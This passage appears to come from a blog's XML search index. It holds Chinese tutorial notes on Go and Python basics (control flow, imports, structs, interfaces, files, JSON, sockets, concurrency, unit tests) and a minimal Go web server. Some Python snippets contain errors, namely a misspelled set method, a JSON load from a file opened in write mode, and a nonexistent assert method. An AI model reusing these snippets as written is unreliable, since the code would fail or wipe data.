int32   0
int64   0
uint    0x0
rune    0 //rune的实际类型是 int32
byte    0x0 // byte的实际类型是 uint8
float32 0 //长度为 4 byte
float64 0 //长度为 8 byte
bool    false
string  &quot;&quot;
</code></pre>
<h2 id="流程控制"><a class="header-anchor" href="#流程控制"></a>流程控制</h2>
<h3 id="条件判断"><a class="header-anchor" href="#条件判断"></a>条件判断</h3>
<p>Go里面<code>if</code>条件判断语句中不需要括号，如下代码所示</p>
<pre><code class="language-go">if x &gt; 10 {
    fmt.Println(&quot;x is greater than 10&quot;)
} else {
    fmt.Println(&quot;x is less than 10&quot;)
}
</code></pre>
<p>多个条件的时候如下所示：</p>
<pre><code class="language-go">if integer == 3 {
    fmt.Println(&quot;The integer is equal to 3&quot;)
} else if integer &lt; 3 {
    fmt.Println(&quot;The integer is less than 3&quot;)
} else {
    fmt.Println(&quot;The integer is greater than 3&quot;)
}
</code></pre>
<p>Go中也有<code>switch-case</code>，特别之处是Go默认每个case后带有一个<code>break</code>，所以不需要我们自己添加<code>break</code>，但是可以使用<code>fallthrough</code>强制执行后面的case代码；</p>
<p>另外，case 后的表达式非常灵活，可以为数值、字符串或者其他表达式</p>
<pre><code class="language-go">switch sExpr {
case expr1:
    some instructions
    fallthrough
case expr2:
    some other instructions
case expr3:
    some other instructions
default:
    other code
}
</code></pre>
<h3 id="循环控制"><a class="header-anchor" href="#循环控制"></a>循环控制</h3>
<p>Go里面最强大的一个控制逻辑就是<code>for</code>，它即可以用来循环读取数据，又可以当作<code>while</code>来控制逻辑，还能迭代操作。它的语法如下：</p>
<pre><code class="language-go">for expression1; expression2; expression3 {
    //...
}
</code></pre>
<p><code>expression1</code>、<code>expression2</code>和<code>expression3</code>都是表达式，其中<code>expression1</code>和<code>expression3</code>是变量声明或者函数调用返回值之类的，<code>expression2</code>是用来条件判断，<code>expression1</code>在循环开始之前调用，<code>expression3</code>在每轮循环结束之时调用。</p>
<p>一个例子比上面讲那么多更有用，那么我们看看下面的例子吧：</p>
<pre><code class="language-go">package main
import &quot;fmt&quot;

func main(){
    sum := 0;
    for index:=0; index &lt; 10 ; index++ {
        sum += index
    }
    fmt.Println(&quot;sum is equal to &quot;, sum)
}
// 输出：sum is equal to 45
</code></pre>
<p>有些时候需要进行多个赋值操作，由于Go里面没有<code>,</code>操作符，那么可以使用平行赋值<code>i, j = i+1, j-1</code></p>
<p>有些时候如果我们忽略<code>expression1</code>和<code>expression3</code>：</p>
<pre><code class="language-go">sum := 1
for ; sum &lt; 1000;  {
    sum += sum
}
</code></pre>
<p>其中<code>;</code>也可以省略，那么就变成如下的代码了，是不是似曾相识？对，这就是<code>while</code>的功能。</p>
<pre><code class="language-go">sum := 1
for sum &lt; 1000 {
    sum += sum
}
</code></pre>
<p>在循环里面有两个关键操作<code>break</code>和<code>continue</code> ,<code>break</code>操作是跳出当前循环，<code>continue</code>是跳过本次循环。当嵌套过深的时候，<code>break</code>和<code>continue</code>还可以跟着标号，配合标签使用，即跳转至标签所指定的位置，详细参考如下例子：</p>
<pre><code class="language-go">for index := 10; index&gt;0; index-- {
    if index == 5{
        break // 或者continue
    }
    fmt.Println(index)
}
// break打印出来10、9、8、7、6
// continue打印出来10、9、8、7、6、4、3、2、1
</code></pre>
<p><code>for</code>配合<code>range</code>可以用于读取<code>slice</code>和<code>map</code>的数据：</p>
<pre><code class="language-go">for k,v:=range map {
    fmt.Println(&quot;map's key:&quot;,k)
    fmt.Println(&quot;map's val:&quot;,v)
}
</code></pre>
<p>由于 Go 支持 “多值返回”, 而对于“声明而未被调用”的变量, 编译器会报错, 在这种情况下, 可以使用<code>_</code>来丢弃不需要的返回值 例如</p>
<pre><code class="language-go">for _, v := range map{
    fmt.Println(&quot;map's val:&quot;, v)
}
</code></pre>
<h3 id="无条件跳转"><a class="header-anchor" href="#无条件跳转"></a>无条件跳转</h3>
<p>Go有<code>goto</code>语句，可以用<code>goto</code>跳转到必须在当前函数内定义的标签。例如假设这样一个循环：</p>
<pre><code class="language-go">func myFunc() {
    i := 0
Here:   //这行的第一个词，以冒号结束作为标签
    println(i)
    i++
    goto Here   //跳转到Here去
}
</code></pre>
<blockquote>
<p>标签名是大小写敏感的。</p>
</blockquote>
<h2 id="import"><a class="header-anchor" href="#import"></a>import</h2>
<p>我们在写Go代码的时候经常用到import这个命令用来导入包文件，而我们经常看到的方式参考如下：</p>
<pre><code>import(
    &quot;fmt&quot;
)
</code></pre>
<p>然后我们代码里面可以通过如下的方式调用</p>
<pre><code>fmt.Println(&quot;hello world&quot;)
</code></pre>
<p>上面这个fmt是Go语言的标准库，其实是去<code>GOROOT</code>环境变量指定目录下去加载该模块，当然Go的import还支持如下两种方式来加载自己写的模块：</p>
<p>1.相对路径</p>
<p>import “./myModule” //当前文件同一目录的myModule目录，但是不建议这种方式来import</p>
<p>2.绝对路径</p>
<p>import “shorturl/model” //加载gopath/src/shorturl/model模块</p>
<p>上面展示了一些import常用的几种方式，但是还有一些特殊的import，让很多新手很费解，下面我们来一一讲解一下到底是怎么一回事</p>
<p>1.点操作</p>
<p>我们有时候会看到如下的方式导入包</p>
<pre><code class="language-go">  import(
      . &quot;fmt&quot;
  )
</code></pre>
<p>这个点操作的含义就是这个包导入之后在你调用这个包的函数时，你可以省略前缀的包名，也就是前面你调用的fmt.Println(“hello world”)可以省略的写成Println(“hello world”)</p>
<p>2.别名操作</p>
<p>别名操作顾名思义我们可以把包命名成另一个我们用起来容易记忆的名字</p>
<pre><code class="language-go">  import(
      f &quot;fmt&quot;
  )
</code></pre>
<p>别名操作的话调用包函数时前缀变成了我们的前缀，即f.Println(“hello world”)</p>
<p>3._操作</p>
<p>这个操作经常是让很多人费解的一个操作符，请看下面这个import</p>
<pre><code class="language-go">  import (
      &quot;database/sql&quot;
      _ &quot;github.com/ziutek/mymysql/godrv&quot;
  )
</code></pre>
<p>_操作其实是引入该包，而不直接使用包里面的函数，而是调用了该包里面的init函数。</p>
<h2 id="函数"><a class="header-anchor" href="#函数"></a>函数</h2>
<p>函数声明</p>
<pre><code class="language-go">func funcName(input1 type1, input2 type2) (output1 type1, output2 type2) {
    //这里是处理逻辑代码
    //返回多个值
    //output1 和 output2 已在上方定义，这里可以省略，只写return
    return output1,output2
}
</code></pre>
<blockquote>
<p>golang 的函数可以返回多个值</p>
<p>input 的 type1 和 type2 相同时，可以只写一个</p>
<p>output 可以省略变量名，只写类型</p>
<p>只有一个 output 时可以省略括号</p>
<p>没有output时就直接省略最后的返回信息</p>
</blockquote>
<h3 id="变参"><a class="header-anchor" href="#变参"></a>变参</h3>
<p>Go函数支持变参。接受变参的函数是有着不定数量的参数的。为了做到这点，首先需要定义函数使其接受变参</p>
<pre><code class="language-go">func myfunc(arg ...int) {}
</code></pre>
<p><code>arg ...int</code>告诉Go这个函数接受不定数量的参数。注意，这些参数的类型全部是<code>int</code>。在函数体中，变量<code>arg</code>是一个<code>int</code>的<code>slice</code></p>
<pre><code class="language-go">package main

import &quot;fmt&quot;

func myfunc(arg ...int) (int,int) {
	sum := 0
	for _,a:=range arg {
		sum += a
		fmt.Printf(&quot;a is %d,sum is %d\n&quot;,a,sum)
	}
	return sum, 1
}

func main() {
	var slice1 []int
	slice1 = append(slice1,1,2,3,4,5,6,7)
	sum,_ := myfunc(1,2,3,4,5,6,7,8,9,10)
	fmt.Printf(&quot;sum from 1 to 10 is %d\n&quot;, sum)
}
</code></pre>
<h3 id="函数作为值、类型"><a class="header-anchor" href="#函数作为值、类型"></a>函数作为值、类型</h3>
<pre><code class="language-go">type testInt func(int) bool  // 声明了一个函数类型
</code></pre>
<pre><code class="language-go">// 声明的函数类型在这个地方当做了一个参数
func filter(slice []int, f testInt) []int {
    var result []int
    for _, value := range slice {
        if f(value) {
            result = append(result, value)
        }
    }
    return result
}
</code></pre>
<p>函数作为参数传递，在使用上较为灵活，在一些通用接口的开发上也非常有效</p>
<h2 id="指针"><a class="header-anchor" href="#指针"></a>指针</h2>
<p>用法与C中的指针差不多</p>
<p><code>&amp;</code>用于取地址</p>
<p><code>*</code>获取指针指向的值</p>
<h2 id="结构体"><a class="header-anchor" href="#结构体"></a>结构体</h2>
<h3 id="定义结构体"><a class="header-anchor" href="#定义结构体"></a>定义结构体</h3>
<pre><code class="language-go">type struct_variable_type struct {
   member definition;
   member definition;
   ...
   member definition;
}
</code></pre>
<h3 id="访问结构体成员"><a class="header-anchor" href="#访问结构体成员"></a>访问结构体成员</h3>
<p>结构体变量或结构体指针都使用<code>.</code>操作符访问结构体成员</p>
<h3 id="method"><a class="header-anchor" href="#method"></a>method</h3>
<p>在定义函数的时候可以为其指定一个<code>receiver</code>，即该函数属于某一个结构体</p>
<pre><code class="language-go">type struct1 struct {

}
func (s1 struct1) test() {
   fmt.Printf(&quot;ahh&quot;)
}

func main() {
   var str1 struct1
   str1.test()   //输出&quot;ahh&quot;
}
</code></pre>
<p><code>struct</code>+<code>method</code>==<code>class</code></p>
<p>method不止能用于结构体，还能用于任何其他的自定义类型,比如：</p>
<pre><code class="language-go">type months map[string]int
func (mon months) test() {
   fmt.Printf(&quot;ahh&quot;)
}
</code></pre>
<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
<p>定义方法</p>
<pre><code class="language-go">/* 定义接口 */
type interface_name interface {
   method_name1 [return_type]
   method_name2 [return_type]
   method_name3 [return_type]
   //...
   method_namen [return_type]
}

/* 定义结构体 */
type struct_name struct {
   /* variables */
}

/* 实现接口方法 */
func (struct_name_variable struct_name) method_name1() [return_type] {
   /* 方法实现 */
}
//...
func (struct_name_variable struct_name) method_namen() [return_type] {
   /* 方法实现*/
}
</code></pre>
<p>实例如下</p>
<pre><code class="language-go">type interface1 interface{
   test()
}
type struct1 struct {

}
func (s1 struct1) test() {
   fmt.Printf(&quot;ahh&quot;)
}

func main() {
   var inter interface1
   inter = new(struct1)
   inter.test()
}
</code></pre>
<p>通过接口，我们就可以使用一个接口来调用多个不同的方法</p>
<h2 id="特性"><a class="header-anchor" href="#特性"></a>特性</h2>
<h3 id="defer"><a class="header-anchor" href="#defer"></a>defer</h3>
<p>defer 语句在函数结束前执行，常用于资源回收</p>
<p>当有多个 defer 语句时，由后向前执行</p>
<pre><code class="language-go">func ReadWrite() bool {
    file.Open(&quot;file&quot;)
    defer file.Close()
    if failureX {
        return false
    }
    if failureY {
        return false
    }
    return true
}
</code></pre>
<h3 id="Panic和Recover"><a class="header-anchor" href="#Panic和Recover"></a>Panic和Recover</h3>
<p>panic用于产生一个异常，recover()位于defer语句中，用于捕获异常信息并从异常中恢复</p>
<pre><code class="language-go">func main() {
   defer func() {
      err := recover()
      if err != nil {
         fmt.Println(&quot;程序运行中出现异常：&quot;, err)
      }
   }()
   panic(&quot;test panic&quot;)

}
</code></pre>
<h3 id="error"><a class="header-anchor" href="#error"></a>error</h3>
<p><code>error</code>是系统自带的一个接口类型的自定义类型，<code>errors</code> 包中包含了一个实现了 <code>error</code> 这个接口的结构体类型 <code>errorString</code>，我们可以直接使用包中的方法来自定义一些错误，从而返回我们希望被上层代码处理的错误信息</p>
<pre><code class="language-go">package main

import (
    &quot;errors&quot;
    &quot;fmt&quot;
)

func main() {
    t, err := divide(2, 0)
    if err != nil {
        fmt.Println(err)
    } else {
        fmt.Println(t)
    }
}

func divide(a, b int) (int, error) {
    if b == 0 {
        return 0, errors.New(&quot;除数不能为0&quot;)
    }
    return a / b, nil
}
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>Python基础</title>
    <url>/2021/01/30/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    <content><![CDATA[<h2 id="输入输出"><a class="header-anchor" href="#输入输出"></a>输入输出</h2>
<p><strong>输出</strong></p>
<pre><code class="language-python">print('%d,%d'%(i,j),end=&quot;&quot;) # print格式化字符串
param = 'hello'
print(f'{param}') # f字符串输出参数

# 浮点数保留精度
a = 2.345
print('%.2f'%a) # 2.35 ,四舍五入
print(round(a,2)) # 2.34 ，五舍六入
</code></pre>
<p><strong>输入</strong></p>
<pre><code class="language-python">a = input(&quot;input a number!\n&quot;)
</code></pre>
<h2 id="常用字符串函数"><a class="header-anchor" href="#常用字符串函数"></a>常用字符串函数</h2>
<pre><code class="language-python"># 1.字母处理：
.upper()    # 全部大写
.lower()    # 全部小写
.swapcase()    # 大小写互换
.capitalize()    # 首字母大写，其余小写
.title()    # 首字母大写

# 2.格式化相关
.ljust(width)     # 获取固定长度，左对齐，右边不够用空格补齐
.rjust(width)     # 获取固定长度，右对齐，左边不够用空格补齐
.center(width)  # 获取固定长度，中间对齐，两边不够用空格补齐
.zfill(width)      # 获取固定长度，右对齐，左边不足用0补齐

# 3.字符串搜索相关
.find()    # 搜索指定字符串，找到则返回对应下标，没有则返回-1
.index()    # 同上，但是找不到会报错
.rfind()    # 从右边开始查找
.count()    # 统计指定的字符串出现的次数

# 4.字符串处理
.split(&quot;分割符(串)&quot;,[分割次数])	# 分割字符串，得到一个子串列表
.replace(&quot;原子串&quot;,&quot;新子串&quot;)	# 子串替换
</code></pre>
<h2 id="常用数据结构"><a class="header-anchor" href="#常用数据结构"></a>常用数据结构</h2>
<p><strong>list-列表</strong></p>
<pre><code class="language-python">a = []
a.append('a')	#在列表最后加入一个元素'a'
a.pop(0)		#删除列表中索引为0的元素
a.insert(0,'b')	#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位
a.index('b')	#返回元素'b'在列表中第一次出现的位置
a.count('b')	#元素'b'在列表中出现的次数
a.__len__()		#返回列表的长度
</code></pre>
<p><strong>tuple-元祖</strong></p>
<pre><code class="language-python"># 元组和列表的区别是：元组中的元素不可变；共同点是都可以使用“[]”进行取值
a = ('a','b','c')	# 创建元组
b = a[2]		# ‘c’
</code></pre>
<p><strong>dict-字典</strong></p>
<pre><code class="language-python">dict1 = {} # 创建dict
dict1['a'] = 100 # 添加元素
key_list = list(i.keys()) # 获取key列表
del dict1 # 清空dict
del dict1['a'] # 删除键值对 ———— 'a':100
</code></pre>
<p><strong>set-集合</strong></p>
<pre><code class="language-python">set1 = {1,2} # 创建set1
set1.add(3) # 新增元素，set1为 {1,2,3}
set1.add(2) # 添加set中已存在的元素，不改变set，仍为 {1,2,3}
set1.add([1,2]) # 报错，不可add可变对象
set1.remove(1) # 从set1中删去元素 1，set1变为 {2,3}
set1.remove(4) # 从set1中删去元素 4，报错，因为set1中不存在元素 4
set1.discard(3) # 从set1中删去元素 3，set1变为 {2}
set1.discard(5) # 从set1中删去元素 5，set1中不存在元素5，set1仍为 {2}，不报错

set2 = {2,3} # 创建set2
set3 = set2.uniom(set1) # 并集
set3 = set2.intersection(set1) # 交集
set3 = set2.difference(set1) # 差集
</code></pre>
<h2 id="类型转换函数"><a class="header-anchor" href="#类型转换函数"></a>类型转换函数</h2>
<pre><code class="language-python">bool()		# 根据传入的参数的逻辑值创建一个新的布尔值
int()		# 根据传入的参数创建一个新的整数
float()		# 根据传入的参数创建一个新的浮点数

bin()		# 将整数转换成2进制字符串
oct()		# 将整数转化成8进制数字符串
hex()		# 将整数转换成16进制字符串

ord()		# 返回Unicode字符对应的整数
chr()		# 返回整数所对应的Unicode字符
str()		# 返回一个对象的字符串表现形式

tuple()		# 根据传入的参数创建一个新的元组
list()		# 根据传入的参数创建一个新的列表
dict()		# 根据传入的参数创建一个新的字典
set()		# 根据传入的参数创建一个新的集合
</code></pre>
<h2 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h2>
<h3 id="文件读写"><a class="header-anchor" href="#文件读写"></a>文件读写</h3>
<pre><code class="language-python">file1 = open(&quot;file_name&quot;,&quot;${mode}&quot;)
file1.write()
file1.close
</code></pre>
<p>mode如下表所示</p>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">含义</th>
<th>文件不存在时</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>r</code></td>
<td style="text-align:center">打开文件以阅读（默认模式）</td>
<td>报错</td>
</tr>
<tr>
<td style="text-align:center"><code>w</code></td>
<td style="text-align:center">打开文件以写入，覆盖原文件</td>
<td>创建</td>
</tr>
<tr>
<td style="text-align:center"><code>a</code></td>
<td style="text-align:center">打开写入，追加到文件末尾</td>
<td>创建</td>
</tr>
<tr>
<td style="text-align:center"><code>b</code></td>
<td style="text-align:center">二进制模式，与<code>r</code> <code>w</code>一起使用</td>
<td></td>
</tr>
<tr>
<td style="text-align:center"><code>t</code></td>
<td style="text-align:center">文本模式（默认就有，不用自己写）</td>
<td></td>
</tr>
<tr>
<td style="text-align:center"><code>+</code></td>
<td style="text-align:center">打开文件进行更新（读取和写入）</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="常用方法"><a class="header-anchor" href="#常用方法"></a>常用方法</h3>
<pre><code class="language-python">__file__ # 当前文件的路径（可能为相对路径，取决于python文件执行的方式）
os.path.realpath(__file__) # 获取当前文件的绝对路径
os.path.dirname(os.path.realpath(__file__)) # 获取当前文件所在目录（不包含文件名）
os.path.join(path,&quot;test.yaml&quot;) # 由目录和文件名结合成为新的文件绝对路径
</code></pre>
<h2 id="import-的使用"><a class="header-anchor" href="#import-的使用"></a>import 的使用</h2>
<p>​	一个<code>.py</code>文件可以看作是一个模块（module），使用<code>import</code>命令将一个模块引入当前python文件，则可以在当前文件使用引入模块中定义的变量，函数等。</p>
<pre><code class="language-python">import module_name	#module_name.py文件可以在sys.path中或者当前文件所在文件夹中
import module_name as mod #引入module_name并设置别名为 mod
from module_name import xxx		#从module_name.py中引入xxx变量或者xxx函数
#从系统目录或当前目录的package_name包里找到module_name.py并引入
from package_name import module_name
</code></pre>
<p>一个包（package）是模块或包的集合，其本质是一个含有<code>__init__.py</code>的文件夹，且<code>__init__.py</code>可以为空。</p>
<h2 id="序列化和反序列化"><a class="header-anchor" href="#序列化和反序列化"></a>序列化和反序列化</h2>
<p>序列化</p>
<pre><code class="language-python">import json

dict1 = {&quot;name&quot;:&quot;Dawnyh&quot;, &quot;age&quot;:20, &quot;id&quot;:&quot;2333&quot;}
json_str = json.dumps(dict1) # 将dict1转为json格式的字符串
dict2 = json.loads(json_str) # 把字符串反序列化为一个新的dict

with open(&quot;file1.json&quot;,&quot;w&quot;) as f:
    json.dump(dict1, f) # 序列化后保存到文件
with open(&quot;file1.json&quot;,&quot;w&quot;) as f:
    dict3 = json.load(f) # 从文件反序列化为dict
</code></pre>
<h2 id="HTTP"><a class="header-anchor" href="#HTTP"></a>HTTP</h2>
<h3 id="发起请求"><a class="header-anchor" href="#发起请求"></a>发起请求</h3>
<p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
<pre><code class="language-python">import requests
url = &quot;http://example.com&quot;
#获取响应包
r = requests.get(url)
try:
	#判断相应包状态码，若不为200则抛出异常
	r.raise_for_status()
	#设置编码方式为从内容中分析出的编码方式
	r.encoding = r.apparent_encoding
except:
	print(&quot;error!&quot;)

#获取响应包内容
print(r.text)
</code></pre>
<h3 id="处理请求"><a class="header-anchor" href="#处理请求"></a>处理请求</h3>
<pre><code class="language-python">import socket

HOST,PORT = '0.0.0.0',18080

# 创建socket，AF_INET表示使用IPv4协议，SOCK_STREAM表示采用TCP协议通信
listen_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# SO_REUSEADDR允许单个进程捆绑同一端口到多个套接字上
listen_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
listen_socket.bind((HOST,PORT)) # 绑定IP和端口
listen_socket.listen(1)
print('Serving HTTP on port %s ...' % PORT)
while True:
	client_connection,client_address = listen_socket.accept()
	request = client_connection.recv(1024)
	# 输出请求内容
    print(request)
	
    # 返回响应内容
	http_response = b&quot;&quot;&quot;
	HTTP/1.1 200 OK\r\n
	\r\n
	Hello,world!
	&quot;&quot;&quot;
	client_connection.send(http_response)
	client_connection.close()
</code></pre>
<h2 id="函数装饰器"><a class="header-anchor" href="#函数装饰器"></a>函数装饰器</h2>
<p>在python中，一切皆对象，包括函数。所以我们可以把函数赋值给变量，也可以把函数作为另一个函数的参数或者返回值，这就是python函数装饰器的基础。python中的装饰器也是一个函数，这个函数的作用是为其他函数增加一些流程或者说行为，也就是装饰。</p>
<p>python函数装饰器常用于权限认证以及记录日志</p>
<h2 id="并发"><a class="header-anchor" href="#并发"></a>并发</h2>
<h3 id="多进程"><a class="header-anchor" href="#多进程"></a>多进程</h3>
<p>考虑到跨平台编程的需求，使用multiprocessing模块中的Process类进行子进程的创建和启动</p>
<pre><code class="language-python">from multiprocessing import Process
from os import getpid
from random import randint
from time import time, sleep


def download_task(filename):
    print('启动下载进程，进程号[%d].' % getpid())
    print('开始下载%s...' % filename)
    time_to_download = randint(5, 10) # 5到10之间的随机整数
    sleep(time_to_download)
    print('%s下载完成! 耗费了%d秒' % (filename, time_to_download))


def main():
    start = time()
    # 创建进程对象p1，执行函数download_task，传入参数('Python从入门到住院.pdf', )
    p1 = Process(target=download_task, args=('Python从入门到住院.pdf', ))
    p1.start() # 启动进程
    p2 = Process(target=download_task, args=('Peking Hot.avi', ))
    p2.start()
    p1.join() # 等待进程执行结束
    p2.join()
    end = time()
    print('总共耗费了%.2f秒.' % (end - start))


if __name__ == '__main__':
    main()
</code></pre>
<p>在多个进程进行同步时，则需要用到进程间通信</p>
<pre><code class="language-python">from multiprocessing import Process,Queue

def print_pingpong(queue,str1):
	while queue.qsize() &lt; 10: # 判断队列中的元素个数
		print(queue.qsize())
		queue.put(1) # 将元素入队列
		# print(str1)
		
def main1():
	queue = Queue(10) # 创建一个队列
    # 把队列作为参数传入
	p1 = Process(target=print_pingpong, args=(queue,'ping', )) 
	p1.start()
	p2 = Process(target=print_pingpong, args=(queue,'pong', ))
	p2.start()
	p1.join()
	p2.join()

if __name__ == '__main__':
    main1()
</code></pre>
<h3 id="多线程"><a class="header-anchor" href="#多线程"></a>多线程</h3>
<p>使用<code>threading</code>模块创建多线程程序，创建线程的方式有从函数启动和从类启动</p>
<p>从函数启动的示例代码如下：</p>
<pre><code class="language-python">import time
from threading import Thread


def sub_task(name:str):
    print(name)
    time.sleep(2)
    print(f'{name} done!')


t1 = Thread(target=sub_task, args=('bob',))
t2 = Thread(target=sub_task, args=('otto',))

t1.start()
t2.start()

t1.join()
t2.join()

print('all done!')
</code></pre>
<p>从类启动的示例代码如下：</p>
<pre><code class="language-python">#!/usr/bin/python3

# 转自：https://www.runoob.com/python3/python3-multithreading.html

import threading
import time

exitFlag = 0

class myThread (threading.Thread):
    def __init__(self, threadID, name, delay):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
    def run(self):
        print (&quot;开始线程：&quot; + self.name)
        print_time(self.name, self.delay, 5)
        print (&quot;退出线程：&quot; + self.name)

def print_time(threadName, delay, counter):
    while counter:
        if exitFlag:
            threadName.exit()
        time.sleep(delay)
        print (&quot;%s: %s&quot; % (threadName, time.ctime(time.time())))
        counter -= 1

# 创建新线程
thread1 = myThread(1, &quot;Thread-1&quot;, 1)
thread2 = myThread(2, &quot;Thread-2&quot;, 2)

# 开启新线程
thread1.start()
thread2.start()
thread1.join()
thread2.join()
print (&quot;退出主线程&quot;)
</code></pre>
<h3 id="协程"><a class="header-anchor" href="#协程"></a>协程</h3>
<p>使用<code>async</code>和<code>await</code>关键字进行声明</p>
<p>例如：</p>
<pre><code class="language-python">async def get_burgers(number: int):# 告诉python这个函数支持异步执行
  # Do some asynchronous stuff to create the burgers
  return burgers

burgers = await get_burgers(2) # 告诉python可以挂起这一步的执行先去执行别的操作
</code></pre>
<p>ps: <code>await</code>必须在使用<code>async def</code>声明的函数中使用</p>
<h2 id="单元测试"><a class="header-anchor" href="#单元测试"></a>单元测试</h2>
<p>对函数进行测试，给他一个输入，验证他的输出是否符合预期</p>
<pre><code class="language-python">import unittest # 导入单元测试模块

# 要测试的函数
def my_div(a, b):
    return a / b

# 测试类
class TestFunc(unittest.TestCase):
    # 测试用例
    def test_div(self):
        self.assertEqual(2, my_div(2,1)) # 判断结果是否等于
        self.assertEqual(-2, my_div(2,-1))
        
    def test_div2(self): # 可以同时测试多个函数
        pass

if __name__ == &quot;__main__&quot;:
    unittest.main()
</code></pre>
<p>在 unittest 的模块中，还有特别丰富的测试方式，常用如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">assert</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">assertEqual(a, b)</td>
<td style="text-align:left"><code>a == b</code></td>
</tr>
<tr>
<td style="text-align:left">assertNotEqual(a, b)</td>
<td style="text-align:left"><code>a != b</code></td>
</tr>
<tr>
<td style="text-align:left">assertTrue(condition)</td>
<td style="text-align:left">condition 是不是 True</td>
</tr>
<tr>
<td style="text-align:left">assertFalse(condition)</td>
<td style="text-align:left">condition 是不是 False</td>
</tr>
<tr>
<td style="text-align:left">assertGreater(a, b)</td>
<td style="text-align:left"><code>a &gt; b</code></td>
</tr>
<tr>
<td style="text-align:left">assertGreaterThan(a, b)</td>
<td style="text-align:left"><code>a &gt;= b</code></td>
</tr>
<tr>
<td style="text-align:left">assertLess(a, b)</td>
<td style="text-align:left"><code>a &lt; b</code></td>
</tr>
<tr>
<td style="text-align:left">assertLessEqual(a, b)</td>
<td style="text-align:left"><code>a &lt;= b</code></td>
</tr>
<tr>
<td style="text-align:left">assertIs(a, b)</td>
<td style="text-align:left"><code>a is b</code>，a 和 b 是不是同一对象</td>
</tr>
<tr>
<td style="text-align:left">assertIsNot(a, b)</td>
<td style="text-align:left"><code>a is not b</code>，a 和 b 是不是不同对象</td>
</tr>
<tr>
<td style="text-align:left">assertIsNone(a)</td>
<td style="text-align:left"><code>a is None</code>，a 是不是 None</td>
</tr>
<tr>
<td style="text-align:left">assertIsNotNone(a)</td>
<td style="text-align:left"><code>a is not None</code>，a 不是 None？</td>
</tr>
<tr>
<td style="text-align:left">assertIn(a, b)</td>
<td style="text-align:left"><code>a in b</code>, a 在 b 里面？</td>
</tr>
<tr>
<td style="text-align:left">assertNotIn(a, b)</td>
<td style="text-align:left"><code>a not in b</code>，a 不在 b 里？</td>
</tr>
<tr>
<td style="text-align:left">assertRaises(err)</td>
<td style="text-align:left">通常和 with 一起用，判断 with 里的功能是否会报错</td>
</tr>
</tbody>
</table>
<h2 id="python3-VS-python2"><a class="header-anchor" href="#python3-VS-python2"></a>python3  VS  python2</h2>
<p><strong>在编码上的区别</strong></p>
<p>​		在 Python2 中，字符串有两个类型，一个是 unicode，一个是 str，前者表示文本字符串，后者表示字节序列，不过两者并没有明显的界限，开发时容易出现编码错误。在 Python3 中对两者做了严格区分，分别用 str 表示字符串，bytes 表示字节序列，任何需要写入文本或者网络传输的数据都只接收字节序列，这就从源头上阻止了编码错误的问题。</p>
<p>​		要指定一个字符串为 bytes 类型，有三种方法：</p>
<ul>
<li>字符串前（引号前）加上前缀<code>b</code> ，但这种方法仅支持 ASCII 字符串；</li>
<li>使用<code>encode()</code>函数</li>
<li>使用<code>bytes()</code>构造函数</li>
</ul>
<pre><code class="language-python">str_a = b&quot;Hello World!&quot;				#正确
str_b = b&quot;一个字符串。&quot;				#错误
str_c = &quot;一个字符串&quot;.encode('utf-8')	#正确，不指定编码方式也默认以utf-8编码
str_d = bytes(&quot;abcde&quot;,'utf-8')		#正确，第二个参数不可省略
</code></pre>
<p>C语言的 printf 函数不支持 Unicode 字符串的输出。在 python3 中想要调用C语言的printf函数，需要将参数由 Unicode 字符串转化为字节序列</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>golang Web后端</title>
    <url>/2021/07/22/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Web%E5%90%8E%E7%AB%AF/</url>
    <content><![CDATA[<p>一个简单的web服务器</p>
<pre><code class="language-go">package main

import (
	&quot;fmt&quot;
	&quot;log&quot;
	&quot;net/http&quot;
	&quot;strings&quot;
)

func sayhelloName(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()  //解析参数，默认是不会解析的
	fmt.Println(r.Form)  //这些信息是输出到服务器端的打印信息
	fmt.Println(&quot;path&quot;, r.URL.Path)
	fmt.Println(&quot;scheme&quot;, r.URL.Scheme)
	fmt.Println(r.Form[&quot;url_long&quot;])
	for k, v := range r.Form {
		fmt.Println(&quot;key:&quot;, k)
		fmt.Println(&quot;val:&quot;, strings.Join(v, &quot;&quot;))
	}
	fmt.Fprintf(w, &quot;Hello astaxie!&quot;) //这个写入到w的是输出到客户端的
}
func sayGoodBye(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, &quot;Goodbye astaxie!&quot;)
}

func main() {
	http.HandleFunc(&quot;/&quot;, sayhelloName) //设置访问的路由
    http.HandleFunc(&quot;/bye&quot;, sayGoodBye)
	err := http.ListenAndServe(&quot;:9090&quot;, nil) //设置监听的端口
	if err != nil {
		log.Fatal(&quot;ListenAndServe: &quot;, err)
	}
}

</code></pre>
<p>我们只需要使用http包的两个函数——<code>HandleFunc()</code>和<code>ListenAndServe()</code>，就可以启动一个简单的web服务。</p>
<p><code>ListenAndServer()</code>监听服务端口并在http请求到来时调用<code>HandleFunc()</code>进行处理</p>
<p><code>HandleFunc()</code>会根据http请求路径的不同调用不同的逻辑处理函数</p>
<p>Go作web服务器不需要nginx/apache，因为它直接监听了tcp端口，做了nginx的事情，而且这个Web服务内部有支持高并发的特性</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
